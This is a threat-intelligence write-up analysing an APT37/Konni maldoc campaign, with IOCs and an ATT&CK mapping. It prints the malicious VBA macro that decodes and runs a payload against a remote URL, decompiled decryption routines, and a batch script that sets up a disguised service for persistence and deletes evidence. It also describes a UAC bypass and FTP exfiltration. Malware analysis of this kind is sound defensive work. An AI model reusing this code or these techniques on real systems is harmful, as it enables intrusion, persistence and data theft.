## APT 37 strike again 
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Link Anyrun](#Links-Anyrun)
  + [Articles](#Articles)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h6>The initial vector is an maldoc with a macro. This launches an auto-open method for decrypt the next stagger, save it and execute it in push as argument the URL to contact. This saves the modification on the document for avoiding to be executing a second time by the victim.</h6>

```vb
Private Sub Document_Open()
    Dim n As Long
    Dim cLine As String
    Dim path As String
    If Image1.Width > 2 And Image1.Height > 2 Then
        Image1.Width = 1
        Image1.Height = 1
        Image2.AutoSize = True
        With ActiveDocument.Content
            .Font.ColorIndex = wdBlack
        End With
        path = save2file()
        cLine = "cmd /c cd /d %USERPROFILE% && ren up.txt up.exe && up http://mydownload-202001.c1.biz"
        n = Shell(cLine, vbHide)
    End If
    ActiveDocument.Save
End Sub
```

<h6>The called method parsed the data and xor by a common value used by North Korean ATP (0XFF). This saves the result on a file on the user profile executing the payload.</h6>

```vb
Function save2file() As String
    Dim nIndex As Long
    Dim path As String
    Dim vbuffer As String
    Dim output() As String
    path = Environ("USERPROFILE")
    path = path & "\up.txt"
    vbuffer = "B2&A5&6F&FF&FC&FF&FF&FF&FB&FF&FF&FF&00&00&FF&FF&47&FF&FF&FF&FF&FF&FF&FF&BF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF"
    [...]
    vbuffer = vbuffer + "88&8C&8F&8D&96&91&8B&99&BE&FF&FF&FF&A9&9A&8D&AE&8A&9A&8D&86&A9&9E&93&8A&9A&A8&FF&FF&FF&6F&FF&FF&F3&FF&FF&FF&1D&C6&27&C4&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF&FF"
    output = Split(vbuffer, "&")
    Open path For Binary As #1
    For nIndex = LBound(output) To UBound(output)
        Put #1, , CByte(("&H" & output(nIndex)) Xor &HFF)
    Next nIndex
    Close #1
    save2file = path
End Function
```

<h6>The second stager executed is a PE (dll file) which is packed with UPX too. This checks the presence of the debugger and the architecture for download, the corresponding dat file.</h6>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/APT37/2020-04-23/Pictures/entry_loader.png"></img></center>
<h6>The algorithm is a custom base64 with a key, this performs a loop which finds the corresponding reference of the index of the reference string (key). Once the done, this return a value and executed again for all the bytes of the payload are decrypted. Once this done, this writes the cab file on temp directory.</h6>

```asm
int32_t __cdecl Decrypt(int32_t arg_8h)
{
    int32_t iVar1;
    char cVar2;
    char cVar3;
    char cVar4;
    char cVar5;
    int32_t in_ECX;
    int32_t in_EDX;
    int32_t iVar6;
    int32_t iVar7;
    uint32_t var_14h;
    int32_t var_10h;
    int32_t var_ch;
    int32_t var_8h;
    int32_t var_4h;
    
    iVar7 = 0;
    iVar6 = 0;
    do {
        cVar2 = fcn.00402460("B2AwV4Ya1TqPoS-ReWsFGMCh!kmgtfJQD6iI5EUKdupv8Hbrzj7yl=LXnZcNO309x", (uint32_t)*(uint8_t *)(iVar7 + in_ECX));
        cVar3 = fcn.00402460("B2AwV4Ya1TqPoS-ReWsFGMCh!kmgtfJQD6iI5EUKdupv8Hbrzj7yl=LXnZcNO309x", (uint32_t)*(uint8_t *)(iVar7 + 1 + in_ECX));
        cVar4 = fcn.00402460("B2AwV4Ya1TqPoS-ReWsFGMCh!kmgtfJQD6iI5EUKdupv8Hbrzj7yl=LXnZcNO309x", (uint32_t)*(uint8_t *)(iVar7 + 2 + in_ECX));
        cVar5 = fcn.00402460("B2AwV4Ya1TqPoS-ReWsFGMCh!kmgtfJQD6iI5EUKdupv8Hbrzj7yl=LXnZcNO309x",  (uint32_t)*(uint8_t *)(iVar7 + 3 + in_ECX));
        iVar7 = iVar7 + 4;
        *(uint8_t *)(iVar6 + in_EDX) = cVar3 - 0x28U >> 4 | (cVar2 + -0x28) * '\x04';
        iVar1 = iVar6 + 1;
        if ((uint8_t)(cVar4 - 0x28U) != 0x40) {
            *(uint8_t *)(iVar6 + 1 + in_EDX) = cVar4 - 0x28U >> 2 | (cVar3 - 0x28U) * '\x10';
            iVar1 = iVar6 + 2;
        }
        iVar6 = iVar1;
        if ((uint8_t)(cVar5 - 0x28U) != 0x40) {
            *(uint8_t *)(iVar6 + in_EDX) = cVar4 << 6 | cVar5 - 0x28U;
            iVar6 = iVar6 + 1;
        }
    } while (iVar7 < arg_8h);
    return iVar6;
}
```

<h6>After this, the program bypass UAC is using a well-known method with access token impersonation routine in duplicates the token from one of the high integrity instances of Windows Update Standalone Installer (wusa.exe). This fileless UAC bypass is named “Cavalry” and comes from the leaks of "Vault7". This spawns a new cmd process for elevate their rights.</h6>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/APT37/2020-04-23/Pictures/elevate_loader.png"></center>

<h6>The elevated prompt expands the cab file and launches the bat file. This stop this own service if already installed and running on the system. Check if the files exist on the system32 folder (already copied) for copy it. Once this, create a service for the persistence and elevate again theirs rights. Finally delete the loader and the files extracted on the temp folder as anti-forensic measures.</h6>

```bash
@echo off

sc stop WPrint > nul

echo %~dp0 | findstr /i "system32" > nul
if %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE)

:COPYFILE
copy /y "%~dp0\wprint.dll" %windir%\System32 > nul
del /f /q "%~dp0\wprint.dll" > nul

copy /y "%~dp0\wprint.ini" %windir%\System32 > nul
del /f /q "%~dp0\wprint.ini" > nul

:INSTALL
sc create WPrint binpath="%windir%\system32\svchost.exe -k WPrint" DisplayName="Windows Print Service" > nul
sc description WPrint "This service opens custom printer dialog boxes and handles notifications from a remote print server or a printer." > nul
sc config WPrint type=own start=auto error=normal binpath="%windir%\system32\svchost.exe -k WPrint" > nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v WPrint /t REG_MULTI_SZ /d "WPrint" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WPrint\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\system32\wprint.dll" /f > nul
sc start WPrint > nul

del /f /q "%USERPROFILE%\up.exe" > nul
del /f /q "%~dpnx0" > nul
```
<h6>The final implant begins by getting the content of ini file for get the configuration. This is also packed with UPX.</h6>

```asm
0x10002367      push 0x208         ; 520
0x1000236c      push esi
0x1000236d      mov ebx, 0x10006f38 ; '8o'
0x10002372      push ebx
0x10002373      mov dword [var_4h], esi
0x10002376      call fcn.100043c0
0x1000237b      add esp, 0xc
0x1000237e      push 0x104         ; 260
0x10002383      push ebx
0x10002384      push dword [0x10006cd0]
0x1000238a      call dword [0x10006cf8]
0x10002390      mov edi, dword [sym.imp.SHLWAPI.dll_StrRChrW] ; 0x10005044
0x10002396      push str..ini      ; 0x10005060 ; u".ini"
0x1000239b      push 0x2e          ; '.' ; 46
0x1000239d      push esi
0x1000239e      push ebx
0x1000239f      call edi
0x100023a1      mov esi, dword [sym.imp.KERNEL32.DLL_lstrcpyW] ; 0x10005028
0x100023a7      push eax
0x100023a8      call esi
0x100023aa      push 0x208         ; 520
0x100023af      push 0
0x100023b1      push 0x10007158    ; 'Xq'
0x100023b6      call fcn.100043c0
0x100023bb      add esp, 0xc
0x100023be      push 0x104         ; 260
0x100023c3      push 0x10007158    ; 'Xq'
0x100023c8      push dword [0x10006cd0]
0x100023ce      call dword [0x10006cf8]
0x100023d4      push str..dat      ; 0x1000506c ; u".dat"
0x100023d9      push 0x2e          ; '.' ; 46
0x100023db      push 0
0x100023dd      push 0x10007158    ; 'Xq'
0x100023e2      call edi
0x100023e4      push eax
0x100023e5      call esi
0x100023e7      xor esi, esi
```
<h6>The content of ini file is a single string encoded with the custom key.</h6>

```bash
gmRc4b2TFu6tLPHvkdsT3Q-UIGa0IbasFdIsFdSClw7cFdR1XPDD
```

<h6>We can note that the same algorithm (custom base 64) for decrypt the data is used but with different parameters and key. An another detail, the function with is used for getting the first occurrence is replaced by a Native function from the Windows Shell for the same structure of the algorithm base 64.</h6>

```asm
int32_t __cdecl fcn.1000203c(int32_t arg_8h)
{
    int32_t iVar1;
    char cVar2;
    char cVar3;
    char cVar4;
    char cVar5;
    int32_t in_ECX;
    int32_t in_EDX;
    int32_t iVar6;
    int32_t iVar7;
    undefined4 var_14h;
    int32_t var_10h;
    undefined4 var_ch;
    undefined4 var_8h;
    int32_t var_4h;
    
    iVar7 = 0;
    iVar6 = 0;
    do {
        cVar2 = (*_sym.imp.SHLWAPI.dll_StrChrA) ("aMob=%PmxS5FIZNV-ROA8BQY3Lgk4XliK1wGWrdj2CpJEUyTfs0qc6uv9tzh7HneD", (uint32_t)*(uint8_t *)(iVar7 + in_ECX));
        cVar3 = (*_sym.imp.SHLWAPI.dll_StrChrA) ("aMob=%PmxS5FIZNV-ROA8BQY3Lgk4XliK1wGWrdj2CpJEUyTfs0qc6uv9tzh7HneD", (uint32_t)*(uint8_t *)(iVar7 + 1 + in_ECX));
        cVar4 = (*_sym.imp.SHLWAPI.dll_StrChrA) ("aMob=%PmxS5FIZNV-ROA8BQY3Lgk4XliK1wGWrdj2CpJEUyTfs0qc6uv9tzh7HneD", (uint32_t)*(uint8_t *)(iVar7 + 2 + in_ECX));
        cVar5 = (*_sym.imp.SHLWAPI.dll_StrChrA) ("aMob=%PmxS5FIZNV-ROA8BQY3Lgk4XliK1wGWrdj2CpJEUyTfs0qc6uv9tzh7HneD", (uint32_t)*(uint8_t *)(iVar7 + 3 + in_ECX));
        iVar7 = iVar7 + 4;
        *(uint8_t *)(iVar6 + in_EDX) = cVar3 - 0x30U >> 4 | (cVar2 + -0x30) * '\x04';
        iVar1 = iVar6 + 1;
        if ((uint8_t)(cVar4 - 0x30U) != 0x40) {
            *(uint8_t *)(iVar6 + 1 + in_EDX) = cVar4 - 0x30U >> 2 | cVar3 << 4;
            iVar1 = iVar6 + 2;
        }
        iVar6 = iVar1;
        if ((uint8_t)(cVar5 - 0x30U) != 0x40) {
            *(uint8_t *)(iVar6 + in_EDX) = cVar4 << 6 | cVar5 - 0x30U;
            iVar6 = iVar6 + 1;
        }
    } while (iVar7 < arg_8h);
    return iVar6;
}
```

<h6>Once the strings decrypted, this adds a new reference of the codepage for the console stream (UTF8).</h6>

```bash
REG ADD HKCU\Console /v CodePage /t REG_DWORD /d 65001 /f
```
<h6>After sleep the process as anti-sandbox measure, this uses the URL for download the last file (4.dat) which contents, the credentials for sending to the FTP. Finally, the implant sends the system informations, list of files by FTP encoded with the custom base64 algorithm.</h6>

<h6>On the TTPs, we can note the differences compared to the TTPs observed at the end of 2019, the main differences are in bitwise operations in custom base 64 and the use of an XOR (0xFF) instead of certutil for decode the base 64 payload.In using this XOR method with this value would leave it possible that Lazarus shared one of their tools for macro editing, some parts of the code matched with parts of code used from the campagne the last year. Here, we can see TTPs from the Medium article (2019 - cf. Links):</h6>
<center><img src="https://miro.medium.com/max/1400/1*CfSltI6XAjK-X9tb9J2FvQ.png" legend="TTPs from the Medium article (cf. Links)"></img></center>

<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
<h6>This process graph represent the cyber kill chain used by the attacker.</h6>
<center>
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/APT37/2020-04-23/Pictures/killchain.png"></img>
</center>
<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> The IOC can be exported in <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/APT37/2020-04-23/JSON/IOC-Konni_2020_04-23.json">JSON</a> and <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/APT37/2020-04-23/CSV/IOC-Konni_2020_04-23.csv">CSV</a></h6>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Command-Line Interface<br>Execution through API|https://attack.mitre.org/techniques/T1059/<br>https://attack.mitre.org/techniques/T1106/|
|Persistence|Modify Existing Service<br>New Service|https://attack.mitre.org/techniques/T1031/<br>https://attack.mitre.org/techniques/T1050/|
|Privilege Escalation|New Service|https://attack.mitre.org/techniques/T1050/|
|Defense Evasion|Modify Registry</br>Deobfuscate/Decode Files or Information|https://attack.mitre.org/techniques/T1112/</br>https://attack.mitre.org/techniques/T1140/|
|Discovery|System Service Discovery<br>Query Registry|https://attack.mitre.org/techniques/T1007/<br>https://attack.mitre.org/techniques/T1012/|
|Command And Control|Custom Cryptographic Protocol|https://attack.mitre.org/techniques/T1024/|

<h6> This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/APT37/2020-04-23/JSON/Mitre-Konni_2020_04-23.json">Export in JSON</a></h6>

<h2>Links <a name="Links"></a></h2>
<h6> Original tweet: </h6><a name="tweet"></a>

* [https://twitter.com/Timele9527/status/1252446369987432449](https://twitter.com/Timele9527/status/1252446369987432449) 

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>

* [guidance.doc](https://app.any.run/tasks/c4961742-886d-4024-a097-209d769eb45f/)

<h6>Articles <a name="Articles"></a></h6>

 + [A Look Into Konni 2019 Campaign](https://medium.com/d-hunter/a-look-into-konni-2019-campaign-b45a0f321e9b)
 + [SYSCON Backdoor Uses FTP as a C&C Channel)](https://blog.trendmicro.com/trendlabs-security-intelligence/syscon-backdoor-uses-ftp-as-a-cc-channel/)
